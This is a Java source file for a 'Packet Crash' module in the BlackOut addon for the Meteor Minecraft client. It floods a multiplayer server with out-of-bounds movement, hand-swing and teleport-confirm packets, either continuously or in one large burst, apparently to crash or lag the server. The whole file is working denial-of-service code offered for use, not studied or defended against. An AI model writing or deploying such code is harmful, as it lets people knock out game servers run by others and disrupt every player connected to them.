package kassuk.addon.blackout.modules;

import kassuk.addon.blackout.BlackOut;
import kassuk.addon.blackout.BlackOutModule;
import meteordevelopment.meteorclient.events.packets.PacketEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.*;
import meteordevelopment.meteorclient.utils.player.ChatUtils;
import meteordevelopment.orbit.EventHandler;
import meteordevelopment.orbit.EventPriority;
import net.minecraft.network.packet.c2s.play.HandSwingC2SPacket;
import net.minecraft.network.packet.c2s.play.KeepAliveC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;
import net.minecraft.network.packet.c2s.play.TeleportConfirmC2SPacket;
import net.minecraft.text.Text;
import net.minecraft.util.Hand;

import java.util.Random;

/*
Made by OLEPOSSU / Raksamies and KassuK
*/

public class PacketCrash extends BlackOutModule {
    public PacketCrash() {
        super(BlackOut.BLACKOUT, "Packet Crash", "Sends packets");
    }
    private final SettingGroup sgGeneral = settings.getDefaultGroup();
    private final Setting<SendMode> mode = sgGeneral.add(new EnumSetting.Builder<SendMode>()
        .name("Mode")
        .description("Mode.")
        .defaultValue(SendMode.Spam)
        .build()
    );

    // Instant
    private final Setting<Integer> packets = sgGeneral.add(new IntSetting.Builder()
        .name("Packets")
        .description("How many packets to send instantly.")
        .defaultValue(420)
        .min(0)
        .sliderMax(1000)
        .visible(() -> mode.get().equals(SendMode.InstantBound))
        .build()
    );

    // Spam
    private final Setting<Boolean> bounds = sgGeneral.add(new BoolSetting.Builder()
        .name("Out Of Bounds")
        .description("Send out of bounds packets.")
        .defaultValue(true)
        .visible(() -> mode.get().equals(SendMode.Spam))
        .build()
    );
    private final Setting<Integer> boundsAmount = sgGeneral.add(new IntSetting.Builder()
        .name("Bounds Amount")
        .description("Per tick.")
        .defaultValue(10)
        .range(0, 100)
        .sliderMax(100)
        .visible(bounds::get)
        .build()
    );
    private final Setting<Integer> boundsDist = sgGeneral.add(new IntSetting.Builder()
        .name("Bounds Dist")
        .description("Position offset for bounds packets.")
        .defaultValue(1337)
        .sliderRange(-1337, 1337)
        .visible(() -> mode.get().equals(SendMode.Spam) && bounds.get())
        .build()
    );
    private final Setting<Boolean> swing = sgGeneral.add(new BoolSetting.Builder()
        .name("Swing")
        .description("Sends swing packets.")
        .defaultValue(true)
        .visible(() -> mode.get().equals(SendMode.Spam))
        .build()
    );
    private final Setting<Integer> swingAmount = sgGeneral.add(new IntSetting.Builder()
        .name("Swing Amount")
        .description("Per tick.")
        .defaultValue(5)
        .sliderRange(0, 100)
        .visible(() -> mode.get().equals(SendMode.Spam) && swing.get())
        .build()
    );
    private final Setting<Boolean> confirm = sgGeneral.add(new BoolSetting.Builder()
        .name("Confirm")
        .description("Sends confirm packets.")
        .defaultValue(true)
        .visible(() -> mode.get().equals(SendMode.Spam))
        .build()
    );
    private final Setting<Integer> confirmAmount = sgGeneral.add(new IntSetting.Builder()
        .name("Confirm Amount")
        .description("Per tick.")
        .defaultValue(5)
        .sliderRange(0, 100)
        .visible(() -> mode.get().equals(SendMode.Spam) && confirm.get())
        .build()
    );
    private final Setting<Integer> forceLimit = sgGeneral.add(new IntSetting.Builder()
        .name("Limit")
        .description("Doesn't send over this amount of packets.")
        .defaultValue(420)
        .sliderMax(1000)
        .visible(() -> mode.get().equals(SendMode.Spam))
        .build()
    );
    public enum SendMode {
        Spam,
        InstantBound
    }
    int rur = 0;
    int sent = 0;
    String info = "Packets: ";
    Random r = new Random();

    @Override
    public void onActivate() {
        super.onActivate();
        if (mode.get().equals(SendMode.InstantBound) && mc.player != null) {
            sent = 0;
            for (int i = 0; i < packets.get(); i++) {
                if (i % 2 == 0) {
                    float x = (float) Math.cos(Math.toRadians(r.nextFloat() * 360 + 90));
                    float z = (float) Math.sin(Math.toRadians(r.nextFloat() * 360 + 90));
                    mc.player.networkHandler.sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(mc.player.getX() + x * boundsDist.get(), mc.player.getY(), mc.player.getX() + z * boundsDist.get(), mc.player.isOnGround()));
                } else {
                    mc.player.networkHandler.sendPacket(new TeleportConfirmC2SPacket(sent));
                }
            }
            ChatUtils.sendMsg(Text.of("Successfully sent " + packets.get() + " packets"));
            toggle();
        }
    }

    @EventHandler(priority = EventPriority.HIGHEST)
    private void onTick(TickEvent.Pre event) {
        if (mc.player != null && mc.world != null && mode.get().equals(SendMode.Spam)) {
            rur++;
            if (rur % 20 == 0) {
                info = sent > forceLimit.get() ? forceLimit.get() + " (" + sent + ")" : String.valueOf(sent);
                sent = 0;
            }
            if (bounds.get()) {
                sendBounds(boundsAmount.get());
            }
            if (swing.get()) {
                sendSwings(swingAmount.get());
            }
            if (confirm.get()) {
                sendConfirms(confirmAmount.get());
            }
        }
    }
    @EventHandler
    private void onSend(PacketEvent.Send e) {
        if (mode.get().equals(SendMode.Spam)) {
            sent++;
            if (sent >= forceLimit.get() && !(e.packet instanceof KeepAliveC2SPacket)) {
                e.cancel();
            }
        }
    }
    @Override
    public String getInfoString() {
        return mode.get().equals(SendMode.Spam) ? info : null;
    }
    void sendBounds(int amount) {
        for (int i = 0; i < amount; i++) {
            float x = (float) Math.cos(Math.toRadians(r.nextFloat() * 360 + 90));
            float z = (float) Math.sin(Math.toRadians(r.nextFloat() * 360 + 90));
            mc.player.networkHandler.sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(mc.player.getX() + x * boundsDist.get(), mc.player.getY(), mc.player.getX() + z * boundsDist.get(), mc.player.isOnGround()));
        }
    }
    void sendSwings(int amount) {
        for (int i = 0; i < amount; i++) {
            mc.player.networkHandler.sendPacket(new HandSwingC2SPacket(Math.round(r.nextFloat()) == 0 ? Hand.MAIN_HAND : Hand.OFF_HAND));
        }
    }
    void sendConfirms(int amount) {
        for (int i = 0; i < amount; i++) {
            mc.player.networkHandler.sendPacket(new TeleportConfirmC2SPacket(sent));
        }
    }
}
